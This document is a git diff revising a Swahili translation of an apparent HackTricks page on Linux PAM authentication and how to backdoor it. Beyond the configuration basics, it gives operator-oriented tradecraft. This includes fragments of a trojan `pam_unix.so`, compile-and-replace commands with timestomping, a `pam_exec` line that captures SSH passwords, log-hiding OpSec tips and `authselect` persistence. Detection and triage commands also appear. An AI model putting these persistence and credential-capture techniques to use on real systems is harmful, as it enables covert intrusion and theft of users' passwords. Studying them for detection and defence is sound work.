@@ -4,14 +4,14 @@
 
 ### Taarifa za Msingi
 
-**PAM (Pluggable Authentication Modules)** hufanya kazi kama mfumo wa usalama unaothibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta, na kudhibiti ufikiaji wao kulingana na vigezo mbalimbali. Ni kama mlinzi wa kidijitali wa lango, anayehakikisha kuwa watumiaji walioidhinishwa pekee wanaweza kutumia huduma mahususi, huku ikiwezekana kupunguza matumizi yao ili kuzuia mifumo kuzidiwa.
+**PAM (Pluggable Authentication Modules)** hufanya kazi kama utaratibu wa usalama una **thibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta**, na kudhibiti ufikiaji wao kulingana na vigezo mbalimbali. Ni kama mlinzi wa kidijitali wa lango, anayehakikisha kuwa watumiaji walioidhinishwa pekee wanaweza kutumia huduma mahususi, huku ikiwezekana ikipunguza matumizi yao ili kuzuia mfumo kulemewa.
 
 #### Faili za Usanidi
 
-- **Solaris na mifumo inayotumia UNIX** kwa kawaida hutumia faili kuu ya usanidi iliyo katika `/etc/pam.conf`.
-- **Mifumo ya Linux** hupendelea mpangilio wa saraka, huku ikihifadhi usanidi mahususi wa huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi ya huduma ya login inapatikana katika `/etc/pam.d/login`.
+- **Solaris na mifumo inayotegemea UNIX** kwa kawaida hutumia faili kuu ya usanidi iliyo katika `/etc/pam.conf`.
+- **Mifumo ya Linux** hupendelea muundo wa saraka, kwa kuhifadhi usanidi mahususi wa huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi ya huduma ya kuingia inapatikana katika `/etc/pam.d/login`.<sup>[[1]](#references)</sup>
 
-Mfano wa usanidi wa PAM kwa huduma ya login unaweza kuonekana hivi:
+Mfano wa usanidi wa PAM wa huduma ya kuingia unaweza kuonekana hivi:
 ```
 auth required /lib/security/pam_securetty.so
 auth required /lib/security/pam_nologin.so
@@ -26,43 +26,44 @@ session required /lib/security/pam_unix_session.so
 ```
 #### **Maeneo ya Usimamizi ya PAM**
 
-Maeneo haya, au makundi ya usimamizi, yanajumuisha **auth**, **account**, **password**, na **session**, kila moja ikiwa na jukumu la kushughulikia vipengele tofauti vya mchakato wa uthibitishaji na usimamizi wa session:
+Maeneo haya, au makundi ya usimamizi, yanajumuisha **auth**, **account**, **password**, na **session**, kila moja ikiwa na jukumu tofauti katika mchakato wa authentication na usimamizi wa session:<sup>[[1]](#references)</sup>
 
 - **Auth**: Huthibitisha utambulisho wa mtumiaji, mara nyingi kwa kuomba password.
-- **Account**: Hushughulikia uthibitishaji wa account, kwa kuangalia masharti kama uanachama wa group au vizuizi vya muda wa siku.
-- **Password**: Hushughulikia masasisho ya password, ikiwemo ukaguzi wa ugumu au uzuiaji wa dictionary attacks.
-- **Session**: Hushughulikia vitendo wakati wa kuanza au kumaliza session ya service, kama vile ku-mount directories au kuweka resource limits.
+- **Account**: Hushughulikia uthibitishaji wa account, ikikagua masharti kama uanachama wa group au vikwazo vya muda wa siku.
+- **Password**: Hudhibiti masasisho ya password, ikijumuisha ukaguzi wa complexity au kuzuia dictionary attacks.
+- **Session**: Hudhibiti vitendo wakati wa kuanza au kumaliza service session, kama vile ku-mount directories au kuweka resource limits.
 
-#### **Vidhibiti vya Module za PAM**
+#### **Vidhibiti vya PAM Modules**
 
-Vidhibiti huamua mwitikio wa module inapofanikiwa au kushindwa, na hivyo kuathiri mchakato mzima wa uthibitishaji. Hivi ni pamoja na:
+Controls huamua jinsi module inavyojibu mafanikio au kushindwa, na kuathiri mchakato mzima wa authentication. Hivi ni pamoja na:<sup>[[1]](#references)</sup>
 
-- **Required**: Kushindwa kwa module ya required husababisha kushindwa mwishoni, lakini tu baada ya module zote zinazofuata kukaguliwa.
-- **Requisite**: Mchakato hukatizwa mara moja module inaposhindwa.
+- **Required**: Kushindwa kwa required module husababisha kushindwa hatimaye, lakini baada ya modules zote zinazofuata kukaguliwa.
+- **Requisite**: Kusimamishwa mara moja kwa mchakato baada ya kushindwa.
 - **Sufficient**: Mafanikio huruka ukaguzi uliobaki wa realm hiyo hiyo isipokuwa module inayofuata ishindwe.
 - **Optional**: Husababisha kushindwa tu ikiwa ndiyo module pekee kwenye stack.
 
-#### Semantics za Offensive Muhimu
+#### Maana za Offensive Zinazohitajika
 
-Wakati wa kufanya Backdooring PAM, **eneo la rule lililoingizwa** mara nyingi ni muhimu zaidi kuliko payload yenyewe:
+Wakati wa kuweka backdoor kwenye PAM, **mahali pa rule iliyowekwa** mara nyingi ni muhimu zaidi kuliko payload yenyewe:
 
-- `include` na `substack` huvuta rules kutoka kwenye files nyingine, kwa hiyo kuhariri `sshd` kunaweza kuathiri SSH pekee, huku kuhariri `system-auth`, `common-auth`, au shared stack nyingine kukiathiri services kadhaa kwa wakati mmoja.
-- PAM pia inasaidia controls zilizo kwenye mabano kama `[success=1 default=ignore]`. Hizi zinaweza kutumiwa vibaya **kuruka module moja au zaidi** baada ya custom check kufanikiwa, badala ya kubadilisha `pam_unix.so` kwa njia inayoonekana wazi.
+- `include` na `substack` huvuta rules kutoka files nyingine, kwa hiyo kuhariri `sshd` kunaweza kuathiri SSH pekee, ilhali kuhariri `system-auth`, `common-auth`, au shared stack nyingine kunaweza kuathiri services kadhaa kwa wakati mmoja.
+- PAM pia inaunga mkono bracketed controls kama `[success=1 default=ignore]`. Hizi zinaweza kutumiwa vibaya **kuruka module moja au zaidi** baada ya custom check kufanikiwa, badala ya kuonekana wazi kuwa `pam_unix.so` imebadilishwa.
 - `module-path` inaweza kuwa **absolute** (`/usr/lib/security/pam_custom.so`) au **relative** kwa default PAM module directory. Kwenye Linux systems za kisasa, directories halisi mara nyingi huwa `/lib/security`, `/lib64/security`, `/usr/lib/security`, au multiarch paths kama `/usr/lib/x86_64-linux-gnu/security`.
 
-Ushauri wa haraka kwa operator: kila mara tengeneza ramani ya **service graph nzima** kabla ya kufanya patch. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros, au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine, inamaanisha implant hiyo hiyo ya mstari mmoja inaweza kuenea kwa kiwango kikubwa zaidi kuliko ilivyokusudiwa.
+Ushauri wa haraka kwa operator: kila mara ramani **full service graph** kabla ya kufanya patching. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros, au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine, inamaanisha implant hiyo hiyo ya mstari mmoja inaweza kuenea kwa kiwango kikubwa zaidi kuliko ilivyokusudiwa.
 
 #### Mfano wa Scenario
 
-Katika setup yenye auth modules nyingi, mchakato hufuata mpangilio madhubuti. Ikiwa module ya `pam_securetty` itapata kwamba login terminal haijaidhinishwa, root logins huzuiwa, lakini modules zote bado huchakatwa kutokana na status yake ya "required". `pam_env` huweka environment variables, jambo ambalo linaweza kusaidia user experience. Modules za `pam_ldap` na `pam_unix` hufanya kazi pamoja kuthibitisha user, huku `pam_unix` ikijaribu kutumia password iliyotolewa awali, na hivyo kuongeza ufanisi na unyumbufu katika methods za uthibitishaji.
+Katika setup yenye auth modules nyingi, mchakato hufuata mpangilio mkali. Ikiwa module ya `pam_securetty` itagundua kuwa login terminal hairuhusiwi, root logins huzuiwa, lakini modules zote bado huchakatwa kutokana na status yake ya "required". `pam_env` huweka environment variables, ambazo zinaweza kusaidia user experience. Modules za `pam_ldap` na `pam_unix` hushirikiana ku-authenticate user, huku `pam_unix` ikijaribu kutumia password iliyotolewa awali, jambo linaloongeza efficiency na flexibility katika authentication methods.
+
 
 ## Backdooring PAM – Hooking `pam_unix.so`
 
-Mbinu ya kawaida ya persistence katika Linux environments zenye thamani kubwa ni **kubadilisha PAM library halali na drop-in yenye trojan**. Kwa kuwa kila SSH / console login huishia kuita `pam_unix.so:pam_sm_authenticate()`, mistari michache ya C inatosha kukamata credentials au kutekeleza bypass ya password ya *magic*.
+Persistence trick ya kawaida katika Linux environments zenye thamani kubwa ni **kubadilisha PAM library halali na drop-in iliyowekewa trojan**. Kwa kuwa kila SSH / console login huishia kuita `pam_unix.so:pam_sm_authenticate()`, mistari michache ya C inatosha kukamata credentials au kutekeleza password ya *magic* ya kupita authentication.<sup>[[2]](#references)</sup>
 
-### Mwongozo Mfupi wa Compilation
+### Cheatsheet ya Compilation
 <details>
-<summary>Sample ya trojan ya `pam_unix.so`</summary>
+<summary>Mfano wa trojan ya `pam_unix.so`</summary>
 ```c
 #define _GNU_SOURCE
 #include <security/pam_modules.h>
@@ -96,7 +97,7 @@ return orig(pamh, flags, argc, argv);
 ```
 </details>
 
-Compile na ubadilishe kwa siri:
+Compile na stealth-replace:
 ```bash
 gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
 mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
@@ -105,18 +106,18 @@ chmod 644 /lib/security/pam_unix.so     # keep original perms
 touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
 ```
 ### Vidokezo vya OpSec
-1. **Atomic overwrite** – andika kwenye faili ya muda kisha `mv` ili kuiweka mahali pake, hivyo kuepuka libraries zilizoandikwa nusu ambazo zingefungia SSH.
-2. Kuweka log file kama `/usr/bin/.dbus.log` huchanganyika na desktop artefacts halali.
-3. Weka symbol exports zifanane (`pam_sm_setcred`, n.k.) ili kuepuka PAM kufanya kazi isivyotarajiwa.
+1. **Atomic overwrite** – andika kwenye faili la muda kisha tumia `mv` kuliweka mahali pake ili kuepuka libraries zilizoandikwa nusu ambazo zingezuiya SSH.
+2. Kuweka faili la log kama `/usr/bin/.dbus.log` huchanganyika na mabaki halali ya desktop.
+3. Weka symbol exports zikiwa zilezile (`pam_sm_setcred`, n.k.) ili kuepuka tabia isiyo sahihi ya PAM.
 
 ### Utambuzi
-* Linganisha MD5/SHA256 ya `pam_unix.so` na ile ya distro package.
-* `rpm -V pam` au `debsums -s libpam-modules` ili kubaini libraries zilizobadilishwa bila manual hashing.
-* Kagua ownership inayoweza kuandikwa na kila mtu au ownership isiyo ya kawaida chini ya `/lib/security/`.
-* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
-* Tumia Grep kwenye PAM configs kutafuta modules zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.
+* Linganisha MD5/SHA256 ya `pam_unix.so` na ile ya package ya distro.
+* `rpm -V pam` au `debsums -s libpam-modules` ili kugundua libraries zilizobadilishwa bila hashing ya mikono.
+* Kagua faili zenye ruhusa ya kuandikiwa na kila mtu au umiliki usio wa kawaida chini ya `/lib/security/`.
+* Kanuni ya `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
+* Tafuta kwenye PAM configs modules zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.
 
-### Quick triage commands (baada ya compromise au threat hunting)
+### Amri za quick triage (baada ya compromise au threat hunting)
 ```bash
 # 1) Spot alien PAM objects
 find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'
@@ -132,23 +133,23 @@ done
 # 4) Look for stealth config edits
 grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
 ```
-### Kutumia `pam_exec` kwa persistence
+### Kutumia vibaya `pam_exec` kwa persistence
 Badala ya kubadilisha `pam_unix.so`, njia isiyoingilia sana ni kuongeza mstari wa `pam_exec` katika `/etc/pam.d/sshd` ili kila SSH login ianzishe implant huku stack ya kawaida ikiendelea kubaki:
 ```bash
 # Run on successful auth and receive the typed password on stdin
 auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
 ```
-`pam_exec` hupokea metadata ya PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Kwa `expose_authtok`, helper inaweza pia kusoma password kutoka `stdin` wakati wa awamu za `auth` au `password`. Ikiwa unataka helper iendeshe kwa effective UID badala ya real UID, ongeza `seteuid`.
+`pam_exec` hupokea metadata ya PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Ukiweka `expose_authtok`, helper anaweza pia kusoma password kutoka `stdin` wakati wa awamu za `auth` au `password`. Ikiwa unataka helper aendeshe kwa effective UID badala ya real UID, ongeza `seteuid`.
 
-Maelezo ya kiutendaji:
+Maelezo ya vitendo:
 
 - `session optional pam_exec.so ...` ni bora kwa **post-login actions** kama vile kufungua tena sockets au kuanzisha daemon iliyojitenga.
-- `auth optional pam_exec.so quiet expose_authtok ...` ndiyo chaguo la kawaida kwa **credential capture** kwa sababu inaendeshwa kabla session haijafunguka.
-- `type=session` au `type=auth` inaweza kutumiwa kuzuia execution kwenye awamu mahususi ya PAM na kuepuka execution mbili zenye kelele.
+- `auth optional pam_exec.so quiet expose_authtok ...` ndilo chaguo la kawaida kwa **credential capture** kwa sababu huendeshwa kabla session haijafunguliwa.
+- `type=session` au `type=auth` inaweza kutumika kuzuia execution kwenye awamu maalum ya PAM na kuepuka execution maradufu yenye kelele.
 
-### Kunusurika kwa distro tooling: `authselect`
+### Surviving distro tooling: `authselect`
 
-Kwenye RHEL, CentOS Stream, Fedora, na derivative systems, mabadiliko ya moja kwa moja kwenye files zinazozalishwa kama `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kuandikwa upya na `authselect`**. Kwa persistence, operators mara nyingi hubandika active custom profile iliyo chini ya `/etc/authselect/custom/<profile>/`, kisha hui-select tena au hui-apply.
+Kwenye RHEL, CentOS Stream, Fedora, na derivative systems, mabadiliko ya moja kwa moja kwenye files zinazozalishwa kama `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kuandikwa juu na `authselect`**. Kwa persistence, operators mara nyingi hufanyia patch profile custom inayotumika chini ya `/etc/authselect/custom/<profile>/`, kisha kuichagua tena au kuitumia.
 
 Typical workflow ukiwa na root:
 ```bash
@@ -161,16 +162,17 @@ find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 
 # Re-apply the profile after modifying the template files
 authselect select custom/<profile>
 ```
-Hili ni muhimu kwa **offense** na **triage**: ikiwa `/etc/pam.d/system-auth` ina banner `Generated by authselect` na `Do not modify this file manually`, basi sehemu halisi ya persistence inaweza kuwa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.
+Hili ni muhimu kwa offense na triage zote mbili: ikiwa `/etc/pam.d/system-auth` ina banner `Generated by authselect` na `Do not modify this file manually`, basi persistence point halisi inaweza kuwa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.
 
-### Tradecraft ya hivi karibuni iliyoonekana
+### Tradecraft ya hivi karibuni iliyoonekana kwenye mazingira halisi
 
-Ripoti za hivi karibuni za 2025 kuhusu **Plague** Linux backdoor zilionyesha wazo hili hili likiendelezwa zaidi: component hasidi ya PAM yenye **static bypass password**, pamoja na kusafisha environment variables zinazohusiana na SSH na shell history (`HISTFILE=/dev/null`) ili kupunguza session traces baada ya login. Huu ni hunting pattern muhimu kwa sababu logic ya backdoor inaweza kuwa ndani ya PAM, huku stealth artifacts zikionekana tu **baada ya** authentication kufanikiwa.
+Ripoti za hivi karibuni za 2025 kuhusu **Plague** Linux backdoor zilionyesha wazo hilo kuu likiendelezwa zaidi: component hasidi ya PAM yenye **static bypass password**, pamoja na usafishaji wa SSH-related environment variables na shell history (`HISTFILE=/dev/null`) ili kupunguza session traces baada ya login.<sup>[[3]](#references)</sup> Hii ni hunting pattern muhimu kwa sababu backdoor logic inaweza kuwa ndani ya PAM huku stealth artifacts zikionekana tu **baada ya** authentication kufanikiwa.
 
 
 ## Marejeo
 
-- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
-- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
+- [1] [pam.conf(5) / pam.d(5) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
+- [2] [Kitabu cha Mbinu cha Covert Operator: Kuingia kwa Nguvu kwenye Mitandao ya Mawasiliano ya Kimataifa - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
+- [3] [Nextron Systems - Plague: Backdoor Mpya ya Linux Inayotumia PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
 
 {{#include ../../banners/hacktricks-training.md}}
